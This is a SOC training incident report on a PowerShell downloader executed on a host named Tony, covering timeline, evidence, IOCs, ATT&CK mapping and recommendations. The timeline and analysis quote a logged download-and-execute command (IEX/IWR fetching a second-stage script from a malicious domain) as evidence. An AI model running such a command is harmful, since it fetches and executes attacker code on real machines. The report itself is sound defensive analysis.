# SOC153 — PowerShell downloader executed on host Tony

**Severity:** Medium (alerted), High recommended · **Verdict:** True Positive
**Date:** 2026-07-26 · **Analyst:** Kaan Cankaya · **Source:** LetsDefend — SOC Analyst path, alert SOC153 (Event ID 238)

---

## 1. Summary

A user on host `Tony` (172.16.17.206) downloaded a PowerShell script from a public AWS S3 URL and ran
it about 40 seconds later. The script resolved `kionagranada.com`, opened an outbound HTTPS session
that the firewall allowed, and used `IEX(IWR ...)` to fetch and run a second-stage script in memory.
The endpoint agent logged the activity as Detected and did not block it. The host was isolated.
Persistence could not be determined because process telemetry does not cover the incident window.

## 2. Timeline

All times 14 March 2024, UTC.

| Time | Event |
|---|---|
| 16:40:45 | Browser history: `windowslatest.com/windows-11`. History also contains `digitaltrends.com/computing/windows-11-tips` |
| 17:22:25 | `payload_1.ps1` downloaded from `https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1` |
| 17:23 | Script executed. Parent process of `powershell.exe` is `explorer.exe` |
| 17:23 | Alert SOC153 raised. AV/EDR action: Detected |
| 17:23:46 | Sysmon Event 22: `powershell.exe` resolves `kionagranada.com` to `161.22.46.148` |
| 17:23 | Firewall: `172.16.17.206:49848 → 161.22.46.148:443`, status SUCCESS |
| 17:23 | Event 4104: `cmd.exe /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')"` |
| — | Host isolated |

## 3. Analysis

### Is the file malicious

The alert provided a SHA-256 but not the script content, so the verdict required external data. The
hash scores 35/62 on VirusTotal with the label `trojan.powershell/boxter` and the categories
downloader and dropper. VirusTotal holds the same hash under the name `agent3.ps1`, while the
endpoint copy is `payload_1.ps1`. Hunting should therefore use the hash, not the file name.

### What the file is for

A downloader delivers a later stage. The VirusTotal sandbox report shows
`GET https://kionagranada.com:443/upload/beauty.exe` returning 200, together with anti-analysis
behaviour: `IsDebuggerPresent`, extended `Sleep` calls and network adapter enumeration. The
investigation therefore moved from the file to the question of whether our host reached the same
server and what it retrieved.

### What happened on the host

Three sources answer this:

1. **Sysmon Event 22.** `powershell.exe` resolved `kionagranada.com` to `161.22.46.148` at 17:23:46.
   DNS resolution shows intent, not a completed transfer.
2. **Firewall.** An outbound session from `172.16.17.206:49848` to `161.22.46.148:443`, source
   process `powershell.exe`, parent `explorer.exe`, status SUCCESS. The session was established and
   permitted.
3. **Event 4104 (script block logging).** The executed command was
   `IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')`. `Invoke-WebRequest`
   retrieves the content and `Invoke-Expression` runs it, so the second stage executed in memory and
   was not written to disk.

The permitted session and the logged command together support the conclusion that the second stage
was retrieved and executed. Neither source is sufficient on its own: the firewall entry proves the
connection, the 4104 entry proves its purpose.

The host requested `/upload/sd2.ps1` while the public sandbox requested `/upload/beauty.exe`. The
same server hosts more than one payload, so a hunt limited to `beauty.exe` would not have found this
activity.

### Delivery

Email Security returned no matching message, which rules out email as the delivery channel. Browser
history shows the script was downloaded directly from an AWS S3 URL 40 seconds before execution, and
the parent process of `powershell.exe` was `explorer.exe`. This was user execution of a downloaded
file, not exploitation of a vulnerability. The two Windows 11 articles visited earlier are consistent
with a user searching for a utility, but no referrer was recorded and the lure page is not confirmed.

### Limits of the available evidence

Network Action records for this host end at 09:53 and process records end at 12:26, both several
hours before the incident. Child processes of the PowerShell session, any dropped executable and any
persistence mechanism could not be assessed. This is missing telemetry rather than a negative finding.

## 4. Indicators of Compromise

| Indicator | Type | Verdict | Source |
|---|---|---|---|
| `db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0` | SHA-256 | Malicious | VirusTotal 35/62 |
| `https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1` | URL | Malicious | Browser history, delivery |
| `https://kionagranada.com/upload/sd2.ps1` | URL | Malicious | Event 4104, executed on host |
| `https://kionagranada.com/upload/beauty.exe` | URL | Malicious | VirusTotal sandbox, 9/98 |
| `kionagranada.com` | Domain | Malicious | VirusTotal relations, Sysmon Event 22 |
| `161.22.46.148` | IPv4 | Malicious | Sysmon Event 22, firewall session |
| `200.234.225.9` | IPv4 | Suspicious | VirusTotal relations, not observed on host |
| `payload_1.ps1` / `agent3.ps1` | Filename | Malicious | Endpoint alert / VirusTotal |

Machine-readable copy: [`iocs.csv`](./iocs.csv)

`fp2e7a.wpc.phicdn.net`, `svc.ha-teams.office.com` and `8.8.8.8` appear in the sandbox report as
normal background traffic and are excluded.

## 5. MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Execution | T1204.002 — User Execution: Malicious File | Download 17:22:25, execution 17:23, parent process `explorer.exe` |
| Execution | T1059.001 — Command and Scripting Interpreter: PowerShell | Event 4104 script block text |
| Defense Evasion | T1620 — Reflective Code Loading | `IEX(IWR ...)` runs the second stage in memory |
| Defense Evasion | T1497 — Virtualization/Sandbox Evasion | `IsDebuggerPresent`, long sleeps, adapter enumeration in sandbox report |
| Command and Control | T1105 — Ingress Tool Transfer | `sd2.ps1` retrieved from `kionagranada.com` |
| Command and Control | T1071.001 — Application Layer Protocol: Web | HTTPS session to `161.22.46.148:443`, firewall status SUCCESS |
| Command and Control | T1573 — Encrypted Channel | Transfer over TLS on port 443 |

## 6. Verdict and Reasoning

True positive. A malicious script was downloaded, executed by the user, and successfully retrieved
and ran a second stage in memory. The endpoint agent detected the activity without blocking it.

A severity above the alerted Medium is appropriate. The rule fires on the pattern, but the observed
outcome is a completed outbound C2 session and in-memory execution on a workstation.

My initial reading was that this could be an internal security test, based on the generic file name
and on the alert's "Level" field reading "Security Analyst". The second reason was incorrect: that
field is platform metadata describing the case tier, not a property of the incident. The hash lookup
resolved the question immediately.

**Action taken:** host isolated.
**Recommended follow-up:** reset the user's credentials and revoke active sessions; hunt the estate
for `kionagranada.com`, `161.22.46.148` and the S3 delivery URL; reimage the host unless process
telemetry can be recovered to rule out persistence.

## 7. Recommendations

1. **Prevent `.ps1` files from running on double-click.** Set the default handler for `.ps1` to a
   text editor and apply Constrained Language Mode or WDAC/AppLocker for standard users. The chain
   here depended on a user running a script by hand.
2. **Do not rely on domain reputation for egress control.** The first stage was served from
   `amazonaws.com`, which no reputation list will flag. Filter on file type and destination category
   at the proxy, and alert on newly observed external domains contacted by `powershell.exe`.
3. **Change this detection from detect to block.** The agent recorded Detected while the process
   completed a transfer. `powershell.exe` calling `IWR`/`IEX` against an external URL is a suitable
   blocking rule; public Sigma rules for the pattern already matched this sample
   (Usage Of Web Request Commands And Cmdlets — ScriptBlock).
4. **Investigate the telemetry gap.** Process and network records for this host stop hours before the
   incident. Agent health, collection scope and retention should be verified so that future cases can
   answer questions about persistence.

ISO/IEC 27001:2022: A.5.24–A.5.26 (incident management), A.8.7 (protection against malware),
A.8.16 (monitoring activities), A.8.19 (software on operational systems).

## 8. What I Learned

- "Detected" and "Blocked" are different outcomes. Reading them as equivalent closes an incident in
  which code actually executed.
- The hash identifies the sample; the file name does not. The same file appeared under three names
  across the endpoint, VirusTotal and the attacker's server.
- A sandbox report lists all traffic the machine generated. Only a subset belongs in an IOC table.
- Timestamps have to be checked before conclusions are drawn. Two endpoint tabs looked relevant until
  their records turned out to predate the incident by several hours.

---

*Analysis performed in the LetsDefend training environment. No production or customer data is involved.*
